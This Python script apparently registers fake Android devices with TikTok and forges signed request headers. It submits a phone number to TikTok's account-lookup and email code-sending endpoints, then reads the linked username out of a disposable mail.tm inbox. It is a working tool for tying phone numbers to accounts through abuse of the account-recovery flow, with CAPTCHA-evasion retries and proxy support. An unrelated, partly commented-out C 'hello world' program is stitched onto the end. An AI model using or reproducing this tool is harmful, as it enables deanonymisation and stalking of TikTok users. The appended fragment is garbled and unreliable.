import string
import SignerPy
import requests, json, secrets, uuid, binascii, time, random
import httpx, asyncio,os
from user_agent import generate_user_agent
from MedoSigner import Argus, Ladon, md5, Gorgon
import urllib

PROXY_INPUT = input("Enter Proxy (or press Enter to skip. Format: http://proxy): ").strip()
GLOBAL_PROXIES = {"http": PROXY_INPUT, "https": PROXY_INPUT} if PROXY_INPUT else None
HTTPX_PROXIES = PROXY_INPUT if PROXY_INPUT else None

class Device_Register():

    def __init__(self) -> None:
        self.unix = str(int(round(time.time())))

    def gen_device(self,proxies) -> dict:
        url = (
            "https://log-boot.tiktokv.com/service/2/device_register/?req_id="
            + str(uuid.uuid4())
            + "device_platform=android&os=android&ssmix=a&_rticket="
            + str(int(self.unix) * 1000)
            + "&cdid=" + str(uuid.uuid4())
            + "&channel=googleplay&aid=1233&app_name=musical_ly&version_code=450202"
            "&version_name=45.2.2&manifest_version_code=2024502020"
            "&update_version_code=2024502020&ab_version=45.2.2&resolution=1920*985"
            "&dpi=180&device_type="
            + str(random.choice(["SM-S948B","SM-S946B","SM-S941B","SM-S938B",
                                  "SM-S936B","SM-S931B","SM-S928B","SM-S926B",
                                  "SM-S921B","SM-F956B","SM-F741B","SM-A556B",
                                  "SM-A356B","SM-A546B"]))
            + "&device_brand=" + str(random.choice(["samsung"]))
            + "&language=en&os_api=33&os_version=13&ac=mobile&is_pad=0"
            "&app_type=normal&sys_region=US&last_install_time=1781032034"
            "&timezone_name=GMT&app_language=en&timezone_offset=0&host_abi=arm64-v8a"
            "&locale=en&ac2=unknown&uoo=1&op_region=US&build_number=45.2.2&region="
            + str(random.choice(["US","IQ","FR","EG","TR"]))
            + "&ts=" + str(self.unix)
            + "&openudid=" + str(binascii.hexlify(os.urandom(8)).decode())
            + "&okhttp_version=4.2.243.51-tiktok&use_store_region_cookie=1"
        )
        params = url.split("?")[1]
        json_data = {
            "header": {
                "os": "Android", "os_version": "13", "os_api": 33,
                "device_model": params.split("device_type=")[1].split("&")[0],
                "device_brand": str(random.choice(["samsung"])),
                "device_manufacturer": str(random.choice(["samsung"])),
                "cpu_abi": "arm64-v8a", "density_dpi": 180,
                "display_density": "mdpi", "resolution": "985x1920",
                "display_density_v2": "hdpi", "resolution_v2": "1048x1920",
                "access": "mobile",
                "rom": "eng.aleast.20260403.132616",
                "rom_version": "lineage_waydroid_x86_64-userdebug 13 TQ3A.230901.001 eng.aleast.20260403.132616 test-keys",
                "language": random.choice(["en","ar","fr","es"]), "timezone": 0,
                "tz_name": "GMT", "tz_offset": 0,
                "clientudid": str(uuid.uuid4()),
                "openudid": str(params).split("&openudid=")[1].split("&")[0],
                "channel": "googleplay", "not_request_sender": 1, "aid": 1233,
                "release_build": "e7f24b0_20260513", "ab_version": "45.2.2",
                "gaid_limited": 0,
                "custom": {
                    "ram_size": "16GB", "dark_mode_setting_value": 1,
                    "is_flip": 0, "is_foldable": 0, "screen_height_dp": 1707,
                    "filter_warn": 0, "priority_region": "US",
                    "user_period": 0, "is_kids_mode": 0,
                    "web_ua": "Dalvik/2.1.0 (Linux; U; Android 13; "
                              + params.split("device_type=")[1].split("&")[0]
                              + " Build/TQ3A.230901.001)",
                    "screen_width_dp": 988, "user_mode": -1,
                },
                "package": "com.zhiliaoapp.musically",
                "app_version": "45.2.2", "app_version_minor": "",
                "version_code": 450202, "update_version_code": 2024502020,
                "manifest_version_code": 2024502020, "app_name": "musical_ly",
                "tweaked_channel": "googleplay", "display_name": "TikTok",
                "sig_hash": uuid.uuid4().hex,
                "cdid": str(params).split("cdid=")[1].split("&")[0],
                "device_platform": "android", "git_hash": "5ae517f",
                "sdk_version_code": 205140390, "sdk_target_version": 30,
                "req_id": params.split("req_id=")[1].split("device_platform")[0],
                "sdk_version": "2.5.14.3", "guest_mode": 0,
                "sdk_flavor": "i18nInner",
                "apk_first_install_time": int(self.unix) * 1000,
                "is_system_app": 0,
            },
            "magic_tag": "ss_app_log",
            "_gen_time": int(self.unix) * 1000,
        }
        headers = {
            "Host": "log-boot.tiktokv.com",
            "X-Ss-Stub": str(md5(json.dumps(json_data).encode("UTF-8")).hexdigest().upper()),
            "X-Tt-App-Init-Region": "carrierregion=;mccmnc=;sysregion=US;appregion=US",
            "X-Tt-Request-Tag": "t=0;n=1",
            "X-Ss-Req-Ticket": str(int(self.unix) * 1000),
            "X-Vc-Bdturing-Sdk-Version": "2.4.2.i18n",
            "User-Agent": "com.zhiliaoapp.musically/2024502020 (Linux; U; Android 13; en; "
                          + params.split("device_type=")[1].split("&")[0]
                          + "; Build/TQ3A.230901.001;tt-ok/3.12.13.21)",
            "Content-Type": "application/json; charset=utf-8",
            "Connection": "keep-alive",
        }
        response = requests.post(url=url, headers=headers, json=json_data,proxies=proxies)
        # print(response.json())
        try:
            if response.json().get("device_id") == 0:
                return self.gen_device(proxies)
            else:
            
                return {
                    "did":          response.json()["device_id"],
                    "iid":          response.json()["install_id"],
                    "device_brand": "samsung",
                    "device_type":  json_data["header"]["device_model"],
                    "cdid":         json_data["header"]["cdid"],
                    "openudid":     str(params).split("&openudid=")[1].split("&")[0],
                    "req_id":       params.split("req_id=")[1].split("device_platform")[0],
                   
          
                }
        except Exception as e:
            return None

class PhoneToUsernameTikTok:
   def __init__(self, number: str) -> None:
      self.number = number
      self.secret = secrets.token_hex(16)
      self.client = self.client_builder()
      self.xor_number = self.xor(self.number)
      self.device = Device_Register().gen_device(proxies=GLOBAL_PROXIES)
      self.params = self.__get_param(device=self.device)

      self.cookies = {"passport_csrf_token": self.secret, "passport_csrf_token_default": self.secret, "install_id": self.params["iid"]}
      
   def client_builder(self) -> httpx.AsyncClient:
       if HTTPX_PROXIES:
           return httpx.AsyncClient(http2=True, follow_redirects=True, proxy=HTTPX_PROXIES)
       return httpx.AsyncClient(http2=True, follow_redirects=True)
       
   def xor(self, string: str) -> str:
      return "".join([hex(ord(c) ^ 5)[2:] for c in string])
   def __get_domins(self) -> str:
       try:
           r = requests.get("https://api.mail.tm/domains").json()
           return r["hydra:member"][0]["domain"]
       except IndexError:
           return None   
   def __get_param(self,device) -> dict:
       return {
        "request_tag_from": "h5",
        "fixed_mix_mode": "1",
        "mix_mode": "1",
        "account_param": self.xor_number,
        "scene": "1",
        "device_platform": "android",
        "os": "android",
        "ssmix": "a",
        "type": "3736",
        "_rticket": str(round(int(time.time()*1000))),
        "cdid": device["cdid"],
        "channel": "googleplay",
        "aid": "1233",
        "app_name": "musical_ly",
        "version_code": "370805",
        "version_name": "37.8.5",
        "manifest_version_code": "2023708050",
        "update_version_code": "2023708050",
        "ab_version": "37.8.5",
        "resolution": "1600*900",
        "dpi": "240",
        "device_type":device["device_type"],
        "device_brand": device["device_brand"],
        "language": "en",
        "os_api": "28", 
        "os_version": "9",
        "ac": "wifi",
        "is_pad": "0",
        "current_region": "TW",
        "app_type": "normal",
        "sys_region": "US",
        "last_install_time": str(round(int(time.time()*1000))),
        "mcc_mnc": "46692",
        "timezone_name": "Asia/Baghdad",
        "carrier_region_v2": "466",
        "residence": "TW",
        "app_language": "en",
        "carrier_region": "TW",
        "timezone_offset": "10800",
        "host_abi": "arm64-v8a",
        "locale": "en-GB",
        "ac2": "wifi",
        "uoo": "1",
        "op_region": "TW",
        "build_number": "37.8.5",
        "region": "GB",
        "ts": str(round(int(time.time()))),
        "iid": str(device["iid"]),
        "device_id": str(device["did"]),
        "openudid":device["openudid"],
        "support_webview": "1",
        "okhttp_version": "4.2.210.6-tiktok",
        "use_store_region_cookie": "1",
        "app_version": "37.8.5"}

   def __get_token(self, email: str) -> str:
    headers = {
        'User-Agent': str(generate_user_agent()),
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/json',
        'Referer': 'https://mail.tm/',
        'Origin': 'https://mail.tm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Connection': 'keep-alive',
        'Priority': 'u=4',
    }
    json_data = {
        'address': email,
        'password': "NtroAtro", 
    }
    response = requests.post('https://api.mail.tm/token', headers=headers, json=json_data, proxies=GLOBAL_PROXIES)
    try:
        return response.json()["token"]
    except:
        return None

   async def __get_email(self,domin:str) -> dict[str:str, str:str]:
    headers = {
        'User-Agent': str(generate_user_agent()),
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/json',
        'Referer': 'https://mail.tm/',
        'Origin': 'https://mail.tm',
        'Sec-Fetch-Dest': 'empty',
        'Seccd-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Connection': 'keep-alive',
        'Priority': 'u=0',
    }
    json_data = {
        'address': "".join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '@'+domin,
        'password': 'NtroAtro',
    }
    response = requests.post('https://api.mail.tm/accounts', headers=headers, json=json_data, proxies=GLOBAL_PROXIES)
    try:
        return {"id": response.json()["id"], "email": response.json()["address"]}
    except:
        return {"id": None, "email": None}

   async def __get_inbox(self, email: str, token: str, id: str) -> httpx.Response.json:
       try:
           headers = {
                'User-Agent': str(generate_user_agent()),
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Referer': 'https://mail.tm/',
                'Origin': 'https://mail.tm',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'authorization': 'Bearer ' + token,
                'Connection': 'keep-alive',
                'If-None-Match': '{}'.format(id),
                'Priority': 'u=0',
            }
           response = requests.get('https://api.mail.tm/messages', headers=headers, proxies=GLOBAL_PROXIES)
           return response.json()
       except json.JSONDecodeError as e:
            return e
    
   def __get_header(self, signature, parma: dict[str:str, str:str]) -> httpx.Headers:
      return {
        'User-Agent': "com.zhiliaoapp.musically/2023708050 (Linux; U; Android 9; en_" + parma["region"] + "; " + parma["device_type"] + "; Build/SP1A.210812.016;tt-ok/3.12.13.16)",
        'Accept': "application/json, text/plain, */*",
        'x-ss-stub': signature['x-ss-stub'],
        'x-tt-dm-status': "login=1;ct=1;rt=1",
        'x-ss-req-ticket': signature['x-ss-req-ticket'],
        'x-ladon': signature['x-ladon'],
        'x-khronos': parma["ts"], 
        'x-argus': signature['x-argus'],
        'x-gorgon': signature['x-gorgon'],
        'content-type': "application/x-www-form-urlencoded",
        'content-length': '0', 
        }
 
   async def __ticket_request(self) -> httpx.Response:
      for host in [
        "api16-normal-va.tiktokv.com",
        "api16-normal-c-alisg.tiktokv.com",
        "api16-normal-zr.tiktokv.com",
        "api31-normal-useast2a.tiktokv.com",
        "api16-normal-useast5.us.tiktokv.com",
        "api19-normal-useast8.us.tiktokv.com",
        "api31-normal-alisg.tiktokv.com",
        "api16-normal-c-tw.tiktokv.com",
        "api31-normal-zr.tiktokv.com",
        "api16-normal-no1a.tiktokv.eu",
        "api19-normal-ycru.tiktokv.com",
        "api16-normal.tiktokv.com",
        "api16-normal.ttapis.com",
        "api31-normal.tiktokv.com",
        "api22-normal.tiktokv.com",
        "api19-normal.tiktokv.com",
        "api-normal.tiktokv.com",
        "api21-normal.tiktokv.com",
        "api16-core.tiktokv.com",
        "api16-core-va.tiktokv.com",
        "api32-normal.tiktokv.com",
        "api33-normal.tiktokv.com"
    ]:
        try:
            signature = SignerPy.sign(params=self.params,aid=1233,version=8404,cookie=self.cookies)
            response = await self.client.post("https://" + host + "/passport/account_lookup/mobile/", headers=self.__get_header(signature, self.params), params=self.params, cookies=self.cookies)
            # print(response.json())    
            if "'verify_center_decision_conf'" in response.text:
                return "Captch"
            if response.json()["data"] == None:
                return None
            return response
        except Exception as e:
            continue

   async def send_code(self) -> str:
      domin = self.__get_domins()
      tmMail = await self.__get_email(domin=domin) 
      email = tmMail["email"]
      if email == None:
          return await self.send_code()
      
      id = tmMail["id"]
      token = self.__get_token(email=email)
      response_ticket = await self.__ticket_request() 
      if response_ticket == None:
          return "Phone Number Not found in TikTok"
      if response_ticket == "Captch":
          return await self.send_code()
      try:
          ticket = response_ticket.json()["data"]["accounts"][0]["passport_ticket"]
      except Exception as e:
        return await self.send_code()
          
      host = str(response_ticket.url).split("/passport/account_lookup/mobile/")[0].split("https://")[1]
      
      self.params.update({"not_login_ticket": ticket, "email": self.xor(email), "ts": str(round(int(time.time()))), "_rticket": str(round(int(time.time()*1000)))})
      signature = SignerPy.sign(params=self.params,aid=1233,version=8404,cookie=self.cookies)
      
      response = await self.client.post("https://" + host + "/passport/email/send_code/", headers=self.__get_header(signature, self.params), params=self.params, cookies=self.cookies)
      if "email_ticket" in response.text:
          await asyncio.sleep(5)
          inbox = await self.__get_inbox(email=email, token=token, id=id)
          username = await self.__extraxt_username(inbox)
          return username
      else:
          return await self.send_code()
          
   async def __extraxt_username(self, inbox: httpx.Response.json) -> str:
       try:
            username = inbox["hydra:member"][0]["intro"].split("code Hi ")[1].split(",")[0]
            return username
       except Exception as e:
            return str(e)

if __name__ == "__main__":
    username = asyncio.run(PhoneToUsernameTikTok(input("Enter Phone Number with country key :")).send_code())
    if username == "Phone Number Not found in TikTok":
        print("Phone Number Not found in TikTok")
    else:
        print("username -> ", username)
#by -> https://t.me/saftey_1
#include<stdlib.h>
#include<string.h>
#ifdef _WIN32
    #include<io.h>
    #define sys_write _write
#elif defined(__linux__)||defined(__unix__)
    #include<unistd.h>
    #define sys_write write
#endif
# typedef struct{
#     size_t __n;
# }n;
# typedef struct{
#     char *__buf;
#     n *__n;
# }printf;
# static inline printf *print(printf *m,const long __fd){
#     sys_write(__fd,m->__buf,m->__n->__n);
#     return m;
# }
# int main(int argc, char **argv[]){
#     printf *m = (printf*)malloc(sizeof(printf));
#     m->__n = (n*)malloc(sizeof(n));
#     m->__buf = "hello, world\n";
#     m->__n->__n = strlen(m->__buf);
#     const long __fd = 1;
#     m = print(m,__fd);
#     free(m->__n);
#     free(m);
#     return 0;
# }